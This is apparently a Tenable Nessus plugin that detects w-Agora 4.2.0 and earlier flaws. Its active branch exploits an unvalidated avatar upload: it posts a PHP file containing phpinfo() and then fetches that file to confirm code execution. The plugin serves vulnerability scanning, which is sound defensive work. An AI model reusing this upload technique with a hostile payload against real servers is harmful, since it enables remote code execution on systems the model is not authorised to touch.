#
# (C) Tenable Network Security
# 


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The version of w-Agora installed on the remote host fails to validate
files uploaded with the 'browse_avatar.php' and 'insert.php' scripts,
which allows an attacker to upload scripts with arbitrary PHP code and
then to execute it subject to the privileges of the web server user
id.  In addition, it also does not validate the 'site' parameter of
the 'extras/quicklist.php' script before using that to include files,
which can exploited to read arbitrary files if the remote host is
running Windows. 

Solution : 

Unknown at this time.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20061);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(15110);

  script_name(english:"w-Agora <= 4.2.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in w-Agora <= 4.2.0");

  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/agora", "/w-agora", "/forum", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  if (safe_checks()) {
    if (report_paranoia > 1) {
      # Get the version number.
      res = http_get_cache(item:string(dir, "/index.php"), port:port);
      if (res == NULL) exit(0);

      # There's a problem if it's version 4.2.0 or less.
      if (egrep(pattern:'<meta name="GENERATOR" Content="w-agora version ([0-3]\\.|4\\.([01]|2\\.0))', string:res)) {
        report = str_replace(
          string:desc,
          find:"Solution :",
          replace:string(
            "***** Nessus has determined the vulnerability exists on the remote\n",
            "***** host simply by looking at the version number of w-Agora\n",
            "***** installed there.\n",
            "\n",
            "Solution :"
          )
        );
        security_note(port:port, data:report);
        exit(0);
      }
    }
  }
  else {
    # Make sure one of the affected scripts exists.
    req = http_get(item:string(dir, "/browse_avatar.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If it does and allows uploads...
    if ('<input name="avatar" type="file">' >< res) {
      # Try to exploit the flaw.
      avatar = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_"), ".php");
      boundary = "bound";
      req = string(
        "POST ",  dir, "/browse_avatar.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
        # nb: we'll add the Content-Length header and post data later.
      );
      boundary = string("--", boundary);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="site"', "\r\n",
        "\r\n",
        "agora\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="submitted"', "\r\n",
        "\r\n",
        "true\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="perpage"', "\r\n",
        "\r\n",
        "20\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="first"', "\r\n",
        "\r\n",
        "0\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="avatar"; filename="', avatar, '"', "\r\n",
        "Content-Type: application/octet-stream\r\n",
        "\r\n",
        # nb: this is the actual exploit code; you could put pretty much
        #     anything you want here.
        "<? phpinfo() ?>\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="submit"', "\r\n",
        "\r\n",
        "Copy+file\r\n",

        boundary, "--", "\r\n"
      );
      req = string(
        req,
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # Try to run our "avatar".
      req = http_get(
        item:string(dir, "/images/avatars/", avatar), 
        port:port
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if ( res == NULL ) exit(0);

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        report = string(
          desc,
          "\n",
          "\n",
          "Plugin output :\n",
          "\n",
          "Nessus has successfully exploited this vulnerability by uploading a\n",
          "file with PHP code that reveals information about the PHP configuration\n",
          "on the remote host. The file is located under the web server's\n",
          "document directory as:\n",
          "         ", dir, "/images/avatars/", avatar, "\n",
          "You are strongly encouraged to delete this attachment as soon as\n",
          "possible as it can be run by anyone who accesses it remotely.\n"
        );

        security_hole(port:port, data:report);
        exit(0);
      }
    }
  }
}
